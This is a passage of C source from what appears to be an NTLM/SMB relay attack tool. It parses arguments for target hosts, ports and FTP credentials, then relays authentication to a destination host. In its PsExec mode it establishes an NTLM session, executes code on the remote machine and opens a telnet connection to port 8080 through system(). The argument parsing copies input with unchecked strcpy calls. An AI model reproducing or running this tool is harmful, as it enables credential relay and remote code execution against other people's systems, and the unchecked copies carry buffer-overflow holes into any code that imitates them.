				i++;			
			}  else if (strcmp(argv[i],"--SrcHostname")==0) {
				strcpy(lpSrcHostname,argv[i+1]);
				i++;			
			} else if (strcmp(argv[i],"--AlternativeSrcPort")==0) {
				ListeningPort=atoi(argv[i+1]);
				i++;			
			} else if (strcmp(argv[i],"--SMBDestinationHost")==0) {
				DestinationHost=argv[i+1];
				i++;
				/*
				} else if (strcmp(argv[i],"--ProxySMB")==0) {
				dstProtocol = ATTACK_NONE;
				ProxySMB=1;
				*/
			} else if (strcmp(argv[i],"--ftp")==0) {
				strcpy(ftphost,argv[i+1]);
				ftpport=atoi(argv[i+2]);
				strcpy(ftpusername,argv[i+3]);
				strcpy(ftppass,argv[i+4]);
				i+=4;

			} else if (strcmp(argv[i],"--v")==0) {
				verbose=1;
			} else if (strcmp(argv[i],"--vv")==0) {
				verbose=2;
			} else {
				printf("[-] Unknown parameter %s\n",argv[i]);	
				usage();
			}
		} else {
			printf("[-] Unknown parameter %s\n",argv[i]);	
			usage();
		}
	}


	if (!srcProtocol)
	{
		printf("[-] Error - No valid binding selected\n");
		usage();
	}
	if (PsExec)
	{
		if (ConnectToRemoteHost(&relay,DestinationHost,DestinationPort))
		{
			if ( StablishNTLMSession(relay,DestinationHost,lpUsername,lpPassword))
			{              
				if (ExecuteCode( relay))
				{
					char data[256];
					sprintf(data,"telnet %s %i",relay.hostname,8080);    
					system(data);
				}

				return(1);

			}
		}
		return(0);	
	}

	ReplayAttackAgainst( srcProtocol, dstProtocol ,ListeningPort,DestinationHost,DestinationPort);
	return 1;
}

/***********************************************************************************/

